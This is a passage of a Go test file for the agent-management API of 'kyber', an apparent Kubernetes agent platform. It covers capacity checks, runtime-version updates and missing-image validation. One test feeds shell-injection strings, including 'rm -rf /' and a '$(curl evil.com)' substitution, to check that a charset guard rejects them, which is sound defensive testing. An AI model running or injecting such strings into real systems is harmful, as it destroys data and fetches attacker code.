	h, _ := buildAgentHandler(t, smallMachine, agent)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"cpu":    "2",
		"memory": "4Gi",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200: %s", rr.Code, rr.Body.String())
	}
}

// TestAgents_SetResources_MachineMissing_Returns409 verifies that if the
// agent's bound machine has been deleted we return 409 INSUFFICIENT_CAPACITY
// rather than a 500. Capacity is unknowable, so treat as a capacity failure.
func TestAgents_SetResources_MachineMissing_Returns409(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Spec.Machine = "ghost"
	agent.Spec.Resources.CPU = resource.MustParse("1")
	agent.Spec.Resources.Memory = resource.MustParse("2Gi")

	// Note: no Machine object seeded — handler should hit IsNotFound on the Get.
	h, _ := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-resources", map[string]interface{}{
		"cpu": "2",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusConflict {
		t.Fatalf("status = %d, want 409: %s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), "INSUFFICIENT_CAPACITY") {
		t.Errorf("body should mention INSUFFICIENT_CAPACITY; got %s", rr.Body.String())
	}
}

// TestAgents_Create_409_ReadsStatusAvailableCapacity verifies that when the
// machine controller has populated Status.AvailableCapacity (post-#140 happy
// path), the API /create-agent 409 check reads that field directly. Locks in
// the end-to-end contract: 409 INSUFFICIENT_CAPACITY with the live numbers
// in the body when the request exceeds AvailableCapacity.
func TestAgents_Create_409_ReadsStatusAvailableCapacity(t *testing.T) {
	machine := &kyberv1.Machine{
		ObjectMeta: metav1.ObjectMeta{Name: "razer", Namespace: "kyber-system"},
		Spec: kyberv1.MachineSpec{
			Provider: kyberv1.MachineProviderMock,
			Capacity: kyberv1.MachineCapacity{
				CPU:    resource.MustParse("4"),
				Memory: resource.MustParse("8Gi"),
			},
		},
		Status: kyberv1.MachineStatus{
			Phase: kyberv1.MachinePhaseRunning,
			// Controller has reported live capacity: only 500m CPU / 256Mi remain.
			AvailableCapacity: &kyberv1.MachineCapacity{
				CPU:    resource.MustParse("500m"),
				Memory: resource.MustParse("256Mi"),
			},
		},
	}
	h, _ := buildAgentHandler(t, machine)

	// Try to create an agent that exceeds AvailableCapacity.
	req := authedRequest(t, http.MethodPost, "/api/v1/agents", map[string]interface{}{
		"name":    "too-big",
		"machine": "razer",
		"runtime": "claude-code",
		"model":   "claude-sonnet-4",
		"resources": map[string]interface{}{
			"cpu":    "1",   // > 500m available
			"memory": "1Gi", // > 256Mi available
			"disk":   "10Gi",
		},
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusConflict {
		t.Fatalf("want 409, got %d: %s", rr.Code, rr.Body.String())
	}
	body := rr.Body.String()
	if !strings.Contains(body, "INSUFFICIENT_CAPACITY") {
		t.Errorf("body missing INSUFFICIENT_CAPACITY code: %s", body)
	}
	if !strings.Contains(body, "500m") {
		t.Errorf("body missing live available CPU value: %s", body)
	}
	if !strings.Contains(body, "256Mi") {
		t.Errorf("body missing live available memory value: %s", body)
	}
}

// TestAgents_SetRuntimeVersion_Running pins the PR-D wiring: PATCHing
// spec.runtimeVersion on a Running agent updates the spec and triggers a
// pod roll so the new value takes effect on next boot.
func TestAgents_SetRuntimeVersion_Running(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseRunning
	h, fc := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-runtime-version", map[string]interface{}{
		"runtimeVersion": "2.1.200",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.RuntimeVersion != "2.1.200" {
		t.Errorf("RuntimeVersion: got %q, want %q", got.Spec.RuntimeVersion, "2.1.200")
	}
	if got.Spec.DesiredPhase != kyberv1.AgentPhaseRestarting {
		t.Errorf("DesiredPhase = %q, want Restarting", got.Spec.DesiredPhase)
	}
}

// TestAgents_SetRuntimeVersion_RejectsBadCharset proves the charset
// pattern guard runs before the K8s write. Without this guard a crafted
// version string could land on the pod env and reach a shell.
func TestAgents_SetRuntimeVersion_RejectsBadCharset(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	for _, bad := range []string{"2.1.119; rm -rf /", "v$(curl evil.com)", "with space", "with/slash"} {
		req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-runtime-version", map[string]interface{}{
			"runtimeVersion": bad,
		})
		rr := httptest.NewRecorder()
		h.ServeHTTP(rr, req)
		if rr.Code != http.StatusBadRequest {
			t.Errorf("bad input %q: want 400, got %d (body=%s)", bad, rr.Code, rr.Body.String())
		}
	}
}

// TestAgents_SetRuntimeVersion_RejectsOversized: max length enforcement.
func TestAgents_SetRuntimeVersion_RejectsOversized(t *testing.T) {
	h, _ := buildAgentHandler(t, sampleAgentCRD("dave"))
	long := strings.Repeat("a", 65)
	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-runtime-version", map[string]interface{}{
		"runtimeVersion": long,
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusBadRequest {
		t.Errorf("oversized input: want 400, got %d", rr.Code)
	}
}

// TestAgents_SetRuntimeVersion_EmptyClearsField: empty body clears
// spec.runtimeVersion (reverts to fleet default per PR-B resolution).
func TestAgents_SetRuntimeVersion_EmptyClearsField(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Spec.RuntimeVersion = "2.1.119"
	h, fc := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-runtime-version", map[string]interface{}{
		"runtimeVersion": "",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.RuntimeVersion != "" {
		t.Errorf("RuntimeVersion should clear, got %q", got.Spec.RuntimeVersion)
	}
}

// TestAgents_SetRuntimeVersion_Stopped_DoesNotRestart mirrors the
// setAgentModel pattern: a Stopped agent must not be woken when the
// version is changed.
func TestAgents_SetRuntimeVersion_Stopped_DoesNotRestart(t *testing.T) {
	agent := sampleAgentCRD("dave")
	agent.Status.Phase = kyberv1.AgentPhaseStopped
	h, fc := buildAgentHandler(t, agent)

	req := authedRequest(t, http.MethodPost, "/api/v1/agents/dave/set-runtime-version", map[string]interface{}{
		"runtimeVersion": "2.1.200",
	})
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	if rr.Code != http.StatusOK {
		t.Fatalf("want 200, got %d: %s", rr.Code, rr.Body.String())
	}
	got := &kyberv1.Agent{}
	if err := fc.Get(context.Background(), types.NamespacedName{Name: "dave", Namespace: "kyber-system"}, got); err != nil {
		t.Fatalf("refetch: %v", err)
	}
	if got.Spec.DesiredPhase != "" {
		t.Errorf("DesiredPhase = %q, want empty (Stopped agent must not be woken)", got.Spec.DesiredPhase)
	}
}

// --- kyber#674: a registered runtime with no image configured -------------
//
// The bug this guards: creating a Codex agent on an install that never pinned
// image.codex.tag used to return 201. The controller then built a pod with an
// empty containers[0].image, the API server rejected it, and Reconcile bailed
// before writing any status — so the agent sat with a COMPLETELY BLANK status
// forever while the reason appeared only in the control-plane log. Reject at
// creation instead, and say which Helm value to set.

func TestCreateAgent_RejectsRuntimeWithNoImageConfigured(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"codex": true}
	// Registered, but this install never pinned the image.
	s.RuntimeImages = map[string]string{"codex": ""}
	scheme := mustNewScheme(t)
	s.K8sClient = fake.NewClientBuilder().WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).Build()

	body := `{
		"name":"codex-agent","machine":"worker-1","runtime":"codex","model":"gpt-5.6-sol",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth","codexAuthJson":"{\"tokens\":{}}"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)

	if rr.Code != http.StatusBadRequest {
		t.Fatalf("status=%d body=%s — want 400; a runtime with no image can never start", rr.Code, rr.Body.String())
	}
	got := rr.Body.String()
	// Must name the value to set, and must NOT say "unknown runtime": codex IS
	// known here, it just isn't configured, and conflating the two sends the
	// operator hunting in the wrong place.
	if !strings.Contains(got, "image.codex.tag") {
		t.Errorf("error does not name the Helm value to set: %s", got)
	}
	if strings.Contains(got, "unknown runtime") {
		t.Errorf("misleading 'unknown runtime' wording for a registered-but-unconfigured runtime: %s", got)
	}
	// And nothing should have been created.
	agentObj := &kyberv1.Agent{}
	err := s.K8sClient.Get(context.Background(), types.NamespacedName{Name: "codex-agent", Namespace: s.Namespace}, agentObj)
	if err == nil {
		t.Fatal("agent was created despite the runtime having no image configured")
	}
}

func TestCreateAgent_AllowsRuntimeWithImageConfigured(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"codex": true}
	s.RuntimeImages = map[string]string{"codex": "ghcr.io/matty-v/kyber-codex:v2.6.2"}
	scheme := mustNewScheme(t)
	s.K8sClient = fake.NewClientBuilder().WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).Build()

	body := `{
		"name":"codex-agent","machine":"worker-1","runtime":"codex","model":"gpt-5.6-sol",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth","codexAuthJson":"{\"tokens\":{}}"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)

	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s — a configured runtime must still create", rr.Code, rr.Body.String())
	}
}

// A nil RuntimeImages map must not start rejecting everything — dev/test
// servers (and every existing test in this file) leave it unset.
func TestCreateAgent_NilRuntimeImagesSkipsCheck(t *testing.T) {
	s := newTestPublicServer(t, "test-key")
	s.ValidRuntimes = map[string]bool{"codex": true}
	s.RuntimeImages = nil
	scheme := mustNewScheme(t)
	s.K8sClient = fake.NewClientBuilder().WithScheme(scheme).
		WithRuntimeObjects(defaultMachine()).Build()

	body := `{
		"name":"codex-agent","machine":"worker-1","runtime":"codex","model":"gpt-5.6-sol",
		"resources":{"cpu":"1","memory":"2Gi","disk":"50Gi"},
		"secrets":{"authType":"oauth","codexAuthJson":"{\"tokens\":{}}"}
	}`
	req := httptest.NewRequest(http.MethodPost, "/api/v1/agents", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key")
	req.Header.Set("Content-Type", "application/json")
	rr := httptest.NewRecorder()
	buildTestHandler(s).ServeHTTP(rr, req)

	if rr.Code != http.StatusCreated {
		t.Fatalf("status=%d body=%s — nil RuntimeImages must skip the check", rr.Code, rr.Body.String())
	}
}
